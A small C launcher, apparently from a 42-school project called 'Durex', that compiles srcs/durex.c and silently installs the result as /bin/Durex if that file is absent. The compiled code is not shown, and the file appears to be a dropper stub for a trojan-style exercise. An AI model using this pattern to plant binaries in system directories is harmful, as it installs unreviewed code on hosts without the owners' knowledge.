/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/10 22:00:04 by root              #+#    #+#             */
/*   Updated: 2018/06/28 08:17:32 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main()
{
	struct stat buf;

	if (setuid(getuid()) == -1)
		return (1);
	if (lstat("/bin/Durex", &buf) != -1)
		return (1);
	system("gcc -Wall -Werror -Wextra -o obj/durex.o srcs/durex.c -I includes");
	system("gcc -o /bin/Durex obj/durex.o");
	return 0;
}
